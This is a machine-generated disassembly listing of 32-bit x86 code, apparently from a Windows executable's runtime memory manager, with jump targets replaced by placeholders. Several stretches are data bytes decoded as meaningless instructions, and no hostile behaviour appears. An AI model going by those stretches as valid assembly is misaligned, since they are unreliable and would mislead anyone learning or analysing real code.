sub_4010aa
call [ eax + r-xdata ]
add al 0x6
inc esp
outsd
jne r-xdata
push 0x65
arpl [ eax + 0x11 ] si
inc eax
add [ edi ] al
pop es
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + edx + 0x11 ] si
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] al
push ebx
jns r-xdata
insb
add [ gs : ebp + 0x10c00040 ] ecx
inc eax
add [ edx ] cl
push es
push ebx
je r-xdata
add [ eax ] al
inc esi
lea edx [ ecx ]
inc eax
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x12080040 ] cl
inc eax
add [ ecx + 0x4011 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
adc al [ eax ]
or al 0x0
add [ eax ] al
enter 0x4010 0x0
je r-xdata
imul ebp [ esi + 0x67 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0x11
inc eax
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
insd
add [ eax ] al
inc eax
adc [ eax ] eax
sub_40116b
dec esp
add [ esp + 0x4 ] 0xfffffff8
jmp r-xdata
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4033f8
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_40118d
insd
adc [ eax ] eax
ja r-xdata
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
lea edx [ ecx ]
inc eax
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x12080040 ] cl
inc eax
add [ ecx + 0x4011 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
adc al [ eax ]
or al 0x0
add [ eax ] al
enter 0x4010 0x0
inc eax
add [ ecx + 0x1004011 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_4011e9
xor eax 0x58600040
inc eax
add [ eax + ebx * 2 + 0x40 ] ch
add [ eax - 0x6bffbfcb ] ah
xor eax 0x587c0040
inc eax
add al bh
xor al [ eax ]
xor al 0x33
inc eax
add [ ecx ] dl
push esp
dec ecx
outsb
je r-xdata
sar bh 0x25
jb r-xdata
mov esp 0x8b004951
sar bh 0x25
mov eax 0x8b004951
sar bh 0x25
mov ah 0x51
dec ecx
add [ ebx - 0x4fda0040 ] cl
push ecx
dec ecx
add [ ebx - 0x53da0040 ] cl
push ecx
dec ecx
add [ ebx - 0x57da0040 ] cl
push ecx
dec ecx
add [ ebx - 0x5bda0040 ] cl
push ecx
dec ecx
add [ ebx - 0x5fda0040 ] cl
push ecx
dec ecx
add [ ebx - 0x13da0040 ] cl
push ecx
dec ecx
add [ ebx - 0x63da0040 ] cl
push ecx
dec ecx
add [ ebx - 0x67da0040 ] cl
push ecx
dec ecx
add [ ebx - 0x6bda0040 ] cl
push ecx
dec ecx
add [ ebx + 0x425ffc0 ] cl
push edx
dec ecx
add [ ebx + 0x25ffc0 ] cl
push edx
dec ecx
add [ ebx - 0x3da0040 ] cl
push ecx
dec ecx
add [ ebx - 0x6fda0040 ] cl
push ecx
dec ecx
add [ ebx - 0x73da0040 ] cl
push ecx
dec ecx
add [ ebx + 0x1425ffc0 ] cl
push edx
dec ecx
add [ ebx + 0x1025ffc0 ] cl
push edx
dec ecx
add [ ebx + 0xc25ffc0 ] cl
push edx
dec ecx
add [ ebx - 0x77da0040 ] cl
push ecx
dec ecx
add [ ebx - 0x7bda0040 ] cl
push ecx
dec ecx
add [ ebx - 0x7fda0040 ] cl
push ecx
dec ecx
add [ ebx + 0x7c25ffc0 ] cl
push ecx
dec ecx
add [ ebx + 0x7825ffc0 ] cl
push ecx
dec ecx
add [ ebx + 0x7425ffc0 ] cl
push ecx
dec ecx
add [ ebx - 0x3b7cac40 ] cl
mov esp 0xabb
add [ eax + ebp * 8 + 0x49 ] dl
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
sub_4013a8
push ebx
push esi
mov esi rw-data
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov [ esi ] edx
pop esi
pop ebx
retn
push 0x644
push 0x0
call sub_401368
mov ecx eax
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov [ ecx ] eax
mov [ rw-data ] ecx
xor edx edx
xor eax eax
pop esi
pop ebx
retn
mov eax edx
add eax eax
lea eax [ ecx + eax * 8 + 0x4 ]
mov ebx [ esi ]
mov [ eax ] ebx
mov [ esi ] eax
inc edx
cmp edx 0x64
jne r-xdata
sub_401400
push ebx
push esi
mov esi edx
mov ebx eax
call sub_4013a8
test eax eax
jne r-xdata
mov edx [ esi ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebx ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ edx + 0x4 ] eax
mov [ ebx ] eax
mov al 0x1
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_401448
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov [ esp ] edx
mov ebp eax
mov ebx [ ebp ]
mov eax [ esp ]
mov edx [ eax ]
mov [ esi ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0x4 ] edx
add eax [ esi + 0x4 ]
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov eax ebx
call sub_401430
mov eax [ ebx + 0x8 ]
mov [ esi ] eax
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
jmp r-xdata
mov ebx edi
cmp ebp ebx
jne r-xdata
mov eax ebx
call sub_401430
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
mov edi [ ebx ]
mov eax [ esi ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jne r-xdata
mov edx esi
mov eax ebp
call sub_401400
test al al
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esi ] eax
sub_4014b8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx eax
mov edi ebx
mov ebx [ ebx ]
cmp edi ebx
jne r-xdata
mov ecx esi
add ecx [ edx + 0x4 ]
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
ja r-xdata
mov esi [ edx ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jb r-xdata
xor eax eax
cmp esi eax
jne r-xdata
mov ecx esi
mov edi [ edx + 0x4 ]
add ecx edi
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
jne r-xdata
mov eax [ edx + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ edx + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx [ edx + 0x4 ]
mov [ esp ] ecx
mov edi [ ebx + 0x8 ]
add edi [ ebx + 0xc ]
sub edi ecx
mov [ esp + 0x4 ] edi
sub esi eax
mov [ ebx + 0xc ] esi
mov edx esp
mov eax ebx
call sub_401400
test al al
jne r-xdata
sub [ ebx + 0xc ] edi
jmp r-xdata
mov al 0x1
jmp r-xdata
mov eax ebx
call sub_401430
jmp r-xdata
xor eax eax
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_40154c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp esi 0x100000
jge r-xdata
add esi 0xffff
and esi 0xffff0000
mov esi 0x100000
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_401400
test al al
jne r-xdata
mov [ ebx + 0x4 ] esi
push 0x1
push 0x2000
push esi
push 0x0
call sub_401378
mov edi eax
mov [ ebx ] edi
test edi edi
je r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call sub_401380
xor eax eax
mov [ ebx ] eax
sub_4015b0
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov ebp eax
mov [ ebx + 0x4 ] 0x100000
push 0x4
push 0x2000
push 0x100000
push ebp
call sub_401378
mov edi eax
mov [ ebx ] edi
test edi edi
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
add esi 0xffff
and esi 0xffff0000
mov [ ebx + 0x4 ] esi
push 0x4
push 0x2000
push esi
push ebp
call sub_401378
mov [ ebx ] eax
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_401400
test al al
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call sub_401380
xor eax eax
mov [ ebx ] eax
sub_401628
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov [ esp + 0x8 ] 0xffffffff
xor edx edx
mov [ esp + 0xc ] edx
mov ebp eax
mov eax [ esp ]
add eax ebp
mov [ esp + 0x10 ] eax
mov ebx [ rw-data ]
jmp r-xdata
cmp ebx rw-data
jne r-xdata
mov edi [ ebx ]
mov esi [ ebx + 0x8 ]
cmp ebp esi
ja r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
cmp [ esp + 0xc ] 0x0
je r-xdata
mov ebx edi
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0x10 ]
ja r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax ] edx
mov eax [ esp + 0xc ]
sub eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
cmp esi [ esp + 0x8 ]
jae r-xdata
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0xc ]
jbe r-xdata
mov [ esp + 0x8 ] esi
push 0x8000
push 0x0
push esi
call sub_401380
test eax eax
jne r-xdata
mov [ esp + 0xc ] eax
mov eax ebx
call sub_401430
mov [ rw-data ] 0x1
sub_4016e0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edx eax
mov ebp edx
and ebp 0xfffff000
add edx [ esp ]
add edx 0xfff
and edx 0xfffff000
mov [ esp + 0x8 ] edx
mov eax [ esp + 0x4 ]
mov [ eax ] ebp
mov eax [ esp + 0x8 ]
sub eax ebp
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebp ebx
jbe r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi [ esp + 0x8 ]
jbe r-xdata
mov ebx ebp
cmp edi ebx
jbe r-xdata
mov edi [ esp + 0x8 ]
mov esi [ esi ]
push 0x4
push 0x1000
sub edi ebx
push edi
push ebx
call sub_401378
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
sub_401774
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov esi ebx
add esi 0xfff
and esi 0xfffff000
mov [ esp ] esi
mov ebp ebx
add ebp edx
and ebp 0xfffff000
mov eax [ esp ]
mov [ ecx ] eax
mov eax ebp
sub eax [ esp ]
mov [ ecx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebx [ esp ]
jae r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebp edi
jae r-xdata
mov ebx [ esp ]
cmp edi ebx
jbe r-xdata
mov edi ebp
mov esi [ esi ]
push 0x4000
sub edi ebx
push edi
push ebx
call sub_401380
test eax eax
jne r-xdata
mov [ rw-data ] 0x2
sub_4017f4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov edi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
jne r-xdata
cmp edi [ ebx + 0xc ]
jg r-xdata
mov edx esi
mov eax edi
call sub_40154c
cmp [ esi ] 0x0
je r-xdata
mov ebx [ ebx ]
mov ecx esi
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_4016e0
cmp [ esi ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx esi
mov eax ebp
call sub_401448
cmp [ esp ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esi + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ebx [ ebp ]
jmp r-xdata
mov ecx esp
mov edx [ esi + 0x4 ]
mov eax [ esi ]
call sub_401628
xor eax eax
mov [ esi ] eax
mov eax ebx
call sub_401430
jmp r-xdata
sub_401884
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
je r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_4015b0
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp edi [ ebx + 0xc ]
jle r-xdata
mov ebx [ ebx ]
mov ebp [ ebx + 0x8 ]
cmp esi ebp
jne r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401448
cmp [ esp + 0xc ] 0x0
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
sub edx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
add eax [ ebx + 0xc ]
call sub_4015b0
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
cmp edi [ ebx + 0xc ]
jg r-xdata
mov ebx [ ebp ]
jmp r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_401628
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401448
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov ecx [ esp ]
mov edx edi
mov eax ebp
call sub_4016e0
mov eax [ esp ]
cmp [ eax ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_401628
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
mov eax [ esp ]
mov eax [ eax + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esp ]
mov eax [ eax + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
call sub_401430
jmp r-xdata
sub_4019a8
push ebx
push esi
push edi
add esp 0xffffffec
mov edi ecx
mov [ esp ] edx
lea ebx [ eax + 0x3fff ]
and ebx 0xffffc000
mov esi [ esp ]
add esi eax
and esi 0xffffc000
cmp ebx esi
jae r-xdata
xor eax eax
mov [ edi ] eax
mov ecx edi
mov edx esi
sub edx ebx
mov eax ebx
call sub_401774
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax rw-data
call sub_401448
mov ebx [ esp + 0x4 ]
test ebx ebx
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax ebx
call sub_401628
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x8 ] eax
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x4 ]
mov eax rw-data
call sub_4014b8
jmp r-xdata
sub_401a34
push ebp
mov ebp esp
xor edx edx
push ebp
push sub_401aea
push [ fs : edx ]
mov [ fs : edx ] esp
push rw-data
call sub_401388
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_4013f8
mov eax rw-data
call sub_4013f8
mov eax rw-data
call sub_4013f8
push 0xff8
push 0x0
call sub_401368
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push rw-data
call sub_401390
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_401af1
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x3
retn
push rw-data
call sub_401398
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + eax * 4 - 0xc ] ecx
inc eax
cmp eax 0x401
jne r-xdata
mov eax rw-data
mov [ eax + 0x4 ] eax
mov [ eax ] eax
mov [ rw-data ] eax
mov [ rw-data ] 0x1
sub_401af8
push ebp
mov ebp esp
push ebx
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
pop ebp
retn
xor edx edx
push ebp
push sub_401bce
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
mov eax [ rw-data ]
push eax
call LocalFree
xor eax eax
mov [ rw-data ] eax
mov ebx [ rw-data ]
jmp r-xdata
push rw-data
call sub_401390
cmp ebx rw-data
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call sub_401380
mov ebx [ ebx ]
mov eax rw-data
call sub_4013f8
mov eax rw-data
call sub_4013f8
mov eax rw-data
call sub_4013f8
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
mov [ rw-data ] edx
push eax
call LocalFree
mov eax [ rw-data ]
test eax eax
jne r-xdata
push rw-data
call sub_4013a0
retn
push rw-data
call sub_401398
sub_401bd8
push ebx
cmp eax [ rw-data ]
jne r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ eax + 0x8 ]
cmp ecx 0x1000
jg r-xdata
mov edx [ eax + 0x4 ]
mov [ rw-data ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
cmp eax edx
jne r-xdata
test ecx ecx
jns r-xdata
test ecx ecx
jns r-xdata
sar ecx 0x2
mov ebx [ rw-data ]
mov [ ebx + ecx * 4 - 0xc ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
pop ebx
retn
add ecx 0x3
sar ecx 0x2
mov eax [ rw-data ]
xor edx edx
mov [ eax + ecx * 4 - 0xc ] edx
jmp r-xdata
add ecx 0x3
pop ebx
retn
sub_401c3c
mov edx [ rw-data ]
jmp r-xdata
cmp edx rw-data
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp eax ecx
jb r-xdata
mov [ rw-data ] 0x3
xor edx edx
mov edx [ edx ]
add ecx [ edx + 0xc ]
cmp eax ecx
jb r-xdata
mov eax edx
retn
sub_401c6c
push ebx
mov ecx edx
sub ecx 0x4
lea ebx [ ecx + eax ]
cmp edx 0x10
jl r-xdata
cmp edx 0x4
jl r-xdata
mov [ ebx ] 0x80000007
mov edx ecx
call sub_401e40
pop ebx
retn
pop ebx
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
mov [ ebx ] ecx
sub_401cc0
cmp edx 0xc
jl r-xdata
cmp edx 0x4
jl r-xdata
or edx 0x2
mov [ eax ] edx
add eax 0x4
call sub_401c9c
retn
add eax edx
and [ eax ] 0xfffffffe
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
sub_401ce8
push ebx
push esi
mov edx eax
sub edx 0x4
mov edx [ edx ]
mov ecx edx
and ecx 0x80000002
cmp ecx 0x80000002
je r-xdata
mov ebx edx
and ebx 0x7ffffffc
sub eax ebx
mov ecx eax
xor edx [ ecx ]
test edx 0xfffffffe
je r-xdata
mov [ rw-data ] 0x4
test [ ecx ] 0x1
je r-xdata
mov [ rw-data ] 0x5
mov eax ebx
pop esi
pop ebx
retn
mov edx eax
sub edx 0xc
mov esi [ edx + 0x8 ]
sub eax esi
cmp esi [ eax + 0x8 ]
je r-xdata
call sub_401bd8
add ebx esi
mov [ rw-data ] 0x6
sub_401d58
push ebx
push esi
push edi
mov ebx eax
xor edi edi
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
test al 0x2
jne r-xdata
and eax 0x7ffffffc
add edi eax
add ebx eax
mov eax [ ebx ]
mov eax edi
pop edi
pop esi
pop ebx
retn
mov esi ebx
mov eax esi
call sub_401bd8
mov eax [ esi + 0x8 ]
add edi eax
add ebx eax
and [ ebx ] 0xfffffffe
sub_401d90
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov edi edx
mov esi eax
mov [ esp ] 0x0
mov eax esi
call sub_401c3c
mov ebx eax
test ebx ebx
je r-xdata
mov al [ esp ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp [ ebx + 0x8 ]
mov eax ebp
add eax [ ebx + 0xc ]
mov edx eax
lea ecx [ edi + esi ]
sub edx ecx
cmp edx 0xc
jg r-xdata
mov eax esi
sub eax ebp
cmp eax 0xc
jge r-xdata
mov edi eax
sub edi esi
lea ecx [ esp + 0x1 ]
mov edx edi
sub edx 0x4
lea eax [ esi + 0x4 ]
call sub_4019a8
lea ecx [ esp + 0x1 ]
mov edx esi
sub edx [ ebx + 0x8 ]
add edx edi
mov eax ebp
call sub_4019a8
jmp r-xdata
mov edx ebp
sub edx esi
mov eax esi
call sub_401c6c
mov eax ebp
add eax [ esp + 0x5 ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jae r-xdata
mov ebp [ esp + 0x1 ]
test ebp ebp
je r-xdata
lea edx [ esp + 0x1 ]
mov eax ebx
call sub_4014b8
mov [ esp ] 0x1
lea edx [ edi + esi ]
sub edx eax
call sub_401cc0
sub_401e40
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx edi
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
sub eax 0xc
mov [ eax + 0x8 ] esi
cmp esi 0x1000
jg r-xdata
cmp esi 0x3c00
jl r-xdata
mov edx esi
test edx edx
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ebx
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
mov edx esi
mov eax edi
call sub_401d90
test al al
jne r-xdata
sar edx 0x2
mov eax [ rw-data ]
mov eax [ eax + edx * 4 - 0xc ]
test eax eax
jne r-xdata
add edx 0x3
pop edi
pop esi
pop ebx
retn
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
jmp r-xdata
mov eax [ rw-data ]
mov [ eax + edx * 4 - 0xc ] ebx
mov [ ebx + 0x4 ] ebx
mov [ ebx ] ebx
jmp r-xdata
sub_401ec8
cmp [ rw-data ] 0x0
jle r-xdata
retn
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ rw-data ]
or eax 0x2
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
add eax 0x4
call sub_401c9c
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x7
jmp r-xdata
sub_401f14
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi esp
call sub_401ec8
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax rw-data
call sub_401448
mov ebx [ esp + 0x8 ]
test ebx ebx
jne r-xdata
mov eax [ edi ]
cmp ebx eax
jae r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi ]
add eax [ edi + 0x4 ]
mov esi ebx
add esi [ esp + 0xc ]
cmp eax esi
jae r-xdata
call sub_401ce8
sub [ edi ] eax
add [ edi + 0x4 ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
add eax [ edi + 0x4 ]
cmp esi eax
jne r-xdata
call sub_401d58
add [ edi + 0x4 ] eax
mov eax [ edi ]
mov [ rw-data ] eax
mov eax [ edi + 0x4 ]
mov [ rw-data ] eax
mov al 0x1
sub eax 0x4
mov edx 0x4
call sub_401c6c
sub [ edi + 0x4 ] 0x4
sub_401fa0
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
lea eax [ ebx + 0x4 ]
call sub_4017f4
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401f14
test al al
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov al 0x1
sub_401fcc
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_401884
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401f14
test al al
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_402000
xor edx edx
test eax eax
jns r-xdata
sar eax 0x2
cmp eax 0x400
jg r-xdata
add eax 0x3
mov eax edx
retn
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
jne r-xdata
inc eax
cmp eax 0x401
jne r-xdata
sub_40202c
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi rw-data
mov ebp rw-data
mov eax ebx
call sub_401bd8
mov edx [ ebx + 0x8 ]
mov eax edx
sub eax esi
cmp eax 0xc
jl r-xdata
mov ebx [ edi ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov esi edx
cmp ebx [ edi ]
jne r-xdata
mov edx ebx
add edx esi
xchg edx eax
call sub_401e40
jmp r-xdata
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
and [ eax ] 0xfffffffe
mov eax [ ebx + 0x4 ]
mov [ edi ] eax
mov eax ebx
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
mov ebx [ ebx + 0x4 ]
cmp esi [ ebx + 0x8 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x8 ] eax
cmp ebx [ edi ]
je r-xdata
cmp esi 0x1000
jg r-xdata
mov [ edi ] ebx
jmp r-xdata
mov eax esi
call sub_401fa0
test al al
jne r-xdata
mov eax esi
call sub_402000
mov ebx eax
test ebx ebx
jne r-xdata
cmp esi [ ebp ]
jg r-xdata
xor eax eax
jmp r-xdata
mov ebx [ rw-data ]
cmp esi [ ebx + 0x8 ]
jle r-xdata
sub [ ebp ] esi
cmp [ ebp ] 0xc
jge r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
add [ rw-data ] esi
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
jmp r-xdata
add esi [ ebp ]
xor eax eax
mov [ ebp ] eax
sub_402120
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp ebx 0x7ffffff8
jle r-xdata
call sub_401a34
test al al
je r-xdata
xor ecx ecx
push ebp
push sub_40229c
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
add ebx 0x7
and ebx 0xfffffffc
cmp ebx 0xc
jge r-xdata
push rw-data
call sub_401390
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp ebx 0x1000
jg r-xdata
mov ebx 0xc
cmp ebx [ rw-data ]
jg r-xdata
mov eax ebx
test eax eax
jns r-xdata
mov eax ebx
call sub_40202c
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub [ rw-data ] ebx
cmp [ rw-data ] 0xc
jge r-xdata
sar eax 0x2
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
je r-xdata
add eax 0x3
retn
push rw-data
call sub_401398
mov eax [ rw-data ]
add [ rw-data ] ebx
mov edx ebx
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403b7c
jmp r-xdata
add ebx [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edx
mov eax esi
add eax ebx
and [ eax ] 0xfffffffe
mov eax [ edx + 0x4 ]
cmp edx eax
jne r-xdata
mov ecx ebx
test ecx ecx
jns r-xdata
